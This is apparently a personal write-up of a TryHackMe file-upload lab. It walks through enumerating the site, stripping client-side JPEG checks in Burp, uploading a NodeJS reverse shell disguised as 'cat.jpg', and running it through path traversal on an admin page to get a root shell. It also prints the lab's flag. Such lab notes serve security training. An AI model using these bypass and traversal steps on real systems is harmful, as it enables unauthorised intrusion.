==Upload Vulns Challenge   Flutter Aug 13 2021===


## Enumeration ##

--------------------------------------
	Visiting jewel.uploadvulns.thm
--------------------------------------

- wappalyzer

'''
Web Frameworks: Express

Programming Languages: Node.js

Web Servers: Express, Nginx 1.17.6

JS Libraries: jQuery 3.5.1

Reverse Proxies: Nginx 1.17.6
'''


- curl http://jewel.uploadvulns.thm/ > target_sourcecode

'''
<!DOCTYPE html>
<html>
	<head>
		<title>Jewel</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
		<link type="text/css" rel="stylesheet" href="assets/css/style.css">
		<link type="text/css" rel="stylesheet" href="assets/css/cinzel.css">
		<link type="text/css" rel="stylesheet" href="assets/css/exo.css">
		<link type="text/css" rel="stylesheet" href="assets/css/icons.css">
		<link type="image/x-icon" rel="shortcut icon" href="assets/favicon.ico">
		<script src="assets/js/jquery-3.5.1.min.js"></script>
		<script src="assets/js/jquery.colour-2.2.0.min.js"></script>
		<script src="assets/js/upload.js"></script>
		<script src="assets/js/backgrounds.js"></script>
	</head>
	<body>
		<div id="one" class="background"></div>
		<div id="two" class="background" style="display:none;"></div>
		<div id="three" class="background" style="display:none;"></div>
		<div id="four" class="background" style="display:none;"></div>
		<main>
			<object ondragstart="return false;" ondrop="return false;" id="title" data="/assets/title.svg" type="image/svg+xml"></object>
			<p>Have you got a nice image of a gem or a jewel?<br>Upload it here and we'll add it to the slides!</p>
			<button class="Btn" id="uploadBtn"><i id="uploadIcon" class="material-icons">backup</i> Select and Upload</button>
			<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">
		</main>
		<p id="responseMsg" style="display:none;"></p>
	</body>
</html>		
'''

Line 7-15
	'''
	<link type="text/css" rel="stylesheet" href="assets/css/style.css">
	<link type="text/css" rel="stylesheet" href="assets/css/cinzel.css">
	<link type="text/css" rel="stylesheet" href="assets/css/exo.css">
	<link type="text/css" rel="stylesheet" href="assets/css/icons.css">
	<link type="image/x-icon" rel="shortcut icon" href="assets/favicon.ico">
	<script src="assets/js/jquery-3.5.1.min.js"></script>
	<script src="assets/js/jquery.colour-2.2.0.min.js"></script>
	<script src="assets/js/upload.js"></script>
	<script src="assets/js/backgrounds.js"></script>
	'''
		sourced CSS and JS from directory "assets/"

Line 14
	'''
	<script src="assets/js/upload.js"></script>
	'''
		let's check that out

/assets/js/upload.js 
	'''
	$(document).ready(function(){let errorTimeout;const fadeSpeed=1000;function setResponseMsg(responseTxt,colour){$("#responseMsg").text(responseTxt);if(!$("#responseMsg").is(":visible")){$("#responseMsg").css({"color":colour}).fadeIn(fadeSpeed)}else{$("#responseMsg").animate({color:colour},fadeSpeed)}clearTimeout(errorTimeout);errorTimeout=setTimeout(()=>{$("#responseMsg").fadeOut(fadeSpeed)},5000)}$("#uploadBtn").click(function(){$("#fileSelect").click()});$("#fileSelect").change(function(){const fileBox=document.getElementById("fileSelect").files[0];const reader=new FileReader();reader.readAsDataURL(fileBox);reader.onload=function(event){

		//Check File Size
		if (event.target.result.length > 50 * 8 * 1024){
			setResponseMsg("File too big", "red");			
			return;
		}
		//Check Magic Number
		if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
			setResponseMsg("Invalid file format", "red");
			return;	
		}
		//Check File Extension
		const extension = fileBox.name.split(".")[1].toLowerCase();
		if (extension != "jpg" && extension != "jpeg"){
			setResponseMsg("Invalid file format", "red");
			return;
		}


	const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};$.ajax("/",{data:JSON.stringify({name:fileBox.name,type:fileBox.type,file:event.target.result}),contentType:"application/json",type:"POST",success:function(data){let colour="";switch(data){case "success":colour="green";break;case "failure":case "invalid":colour="red";break}setResponseMsg(text[data],colour)}})}})});
	'''
		Client side filters!
		Will remove later with Burp 

Line 26
	'''
	<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">
	'''
		Client-Side filtering for MIME type "image/jpeg"


- Checking dev tools on site finds the background images are sourced from directory /content 
	may be where our uploads go


- gobuster dir -u http://jewel.uploadvulns.thm/ -w directory-list-2.3-medium.txt -o gobuster_jewel

'''
/content (Status: 301)
/modules (Status: 301)
/admin (Status: 200)
/assets (Status: 301)
/Content (Status: 301)
/Assets (Status: 301)
/Modules (Status: 301)
/Admin (Status: 200)
'''

301 redirects are 404 errors

/admin panel

'''
Admin Page

As a reminder: use this form to activate modules from the /modules directory.

Enter filename to execute
'''
	seems to be a page to execute files on the server located under /modules



------------
	Burp
------------

- Intercepting requests and responses

Intercept of /assets/js/upload.js to remove client-side filters

'''
//Check File Size
	if (event.target.result.length > 50 * 8 * 1024){
		setResponseMsg("File too big", "red");			
		return;
	}
//Check Magic Number
	if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
		setResponseMsg("Invalid file format", "red");
		return;	
	}
//Check File Extension
	const extension = fileBox.name.split(".")[1].toLowerCase();
	if (extension != "jpg" && extension != "jpeg"){
		setResponseMsg("Invalid file format", "red");
		return;
	}
'''


Uploading reverse shell for NodeJS from PayloadsAllTheThings
	renamed it "cat.jpg"
	Success!
Going to http://jewel.uploadvulns.thm/content/cat.jpg
	hm nothing, maybe they alter the file names

- gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist -x jpg

'''
/ABH.jpg (Status: 200)
/LKQ.jpg (Status: 200)
/OXW.jpg (Status: 200)
/QOY.jpg (Status: 200)
/SAD.jpg (Status: 200)
/UAD.jpg (Status: 200)
'''

QOY.jpg returns "contains errors", this is our shell, but it didn't run?

If /admin panel runs modules from the /modules dir, what if we try to move out of the /modules dir


- Starting nc listener
- executing ../content/QOY.jpg
	Success!

## RCE ##

whoami
	'root'
id
	'uid=0(root) gid=0(root) groups=0(root)'

cat /var/www/flag.txt returned flag
	THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}